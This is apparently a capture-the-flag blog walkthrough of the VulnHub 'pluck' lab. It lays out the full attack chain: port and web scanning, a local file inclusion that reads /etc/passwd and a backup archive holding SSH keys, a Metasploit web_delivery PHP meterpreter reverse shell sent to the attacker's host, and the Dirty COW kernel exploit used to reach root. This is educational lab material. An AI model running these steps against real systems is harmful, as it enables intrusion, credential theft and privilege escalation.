									Coming towards another tutorial of vulnhub’s lab challenges “pluck” you can download it from here.
This lab is quite simple this article may help you to solve the task for capturing the flag.
Let,s Start
192.168.1.115 is my target IP let enumerate through aggressive scan using NMAP. You can observe its result from the given screenshot.

		
		
			
			
			
			
nmap -p- -A 192.168.1.115
			
				
					
				
					1
				
						nmap -p- -A 192.168.1.115
					
				
			
		


Use Nikto to dig up more information related to the target

		
		
			
			
			
			
nikto -h http://192.168.1.115
			
				
					
				
					1
				
						nikto -h http://192.168.1.115
					
				
			
		

 Finally, I have got something very remarkable here if you notice the given below image the highlighted text looks like local file inclusion vulnerability.

So when I explore the above-highlighted text in the browser here I got more than enough data. The highlighted text denotes towards some kind of backup script file path.

		
		
			
			
			
			
http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd
			
				
					
				
					1
				
						http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd
					
				
			
		


When again I walk around it now further I found a tar file for backup.

		
		
			
			
			
			
http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh
			
				
					
				
					1
				
						http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh
					
				
			
		


A download tar file of backup script, type following command inside the terminal of your Kali Linux.

		
		
			
			
			
			
wget http://192.168.1.115/index.php?page=/backups/backup.tar
			
				
					
				
					1
				
						wget http://192.168.1.115/index.php?page=/backups/backup.tar
					
				
			
		


Now type the following command to extract the backup.tar file

		
		
			
			
			
			
tar –xvf index.php\?page\=%2Fbackups%2Fbackup.tar
			
				
					
				
					1
				
						tar –xvf index.php\?page\=%2Fbackups%2Fbackup.tar
					
				
			
		

Inside it, I found the home folder which further contains a subfolder for 3 users.

Among all 3 users only paul has keys

		
		
			
			
			
			
cd paul
ls
cd keys
ls
			
				
					
				
					1234
				
						cd paullscd keysls
					
				
			
		

So here I found 6 keys, let use one of them for connection.


		
		
			
			
			
			
ssh -i id_key4 paul@192.168.1.115
			
				
					
				
					1
				
						ssh -i id_key4 paul@192.168.1.115
					
				
			
		


When you will try to connect with the target using ssh simultaneously a new terminal “Pdmenu” will pop up. Here I got so many options but I choose Edit file option that gave me a prompt to edit any file and it looks like command injection vulnerability.

Now load Metasploit framework and type following

		
		
			
			
			
			
use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 1
msf exploit (web_delivery)&gt;set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;set lhost 192.168.1.15
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set srvport 8081
msf exploit (web_delivery)&gt;exploit
			
				
					
				
					1234567
				
						use exploit/multi/script/web_deliverymsf exploit (web_delivery)&gt;set target 1msf exploit (web_delivery)&gt;set payload php/meterpreter/reverse_tcpmsf exploit (web_delivery)&gt;set lhost 192.168.1.15msf exploit (web_delivery)&gt;set lport 4444msf exploit (web_delivery)&gt;set srvport 8081msf exploit (web_delivery)&gt;exploit
					
				
			
		

Now copy the generated command php….5tz’));” and send it to target

Now paste above command as shown in the screenshot and hit enter which will give you reverse connection at the background inside Metasploit.

Great!!! We have got victim’s meterpreter session

		
		
			
			
			
			
meterpreter&gt;shell
			
				
					
				
					1
				
						meterpreter&gt;shell
					
				
			
		



		
		
			
			
			
			
uname -a
			
				
					
				
					1
				
						uname -a
					
				
			
		

 Now use Dirty cow exploit
Here got the path to download exploit which might be related to it.

Open this path “http://www.exploit-db.com/download/40616” in the browser and downloads the exploit for dirty cow vulnerability. I have saved this exploit as raj.

Now type the following command to compile your exploit so that it can run successfully inside your Kali Linux.

		
		
			
			
			
			
gcc shell.c -o raj -pthread
			
				
					
				
					1
				
						gcc shell.c -o raj -pthread
					
				
			
		


Now we can run our exploit to achieve root permission and try to capture the flag

		
		
			
			
			
			
./raj
cd /root
ls
cat flag.txt
			
				
					
				
					1234
				
						./rajcd /rootlscat flag.txt
					
				
			
		

 Bravo!!! We have captured the flag.
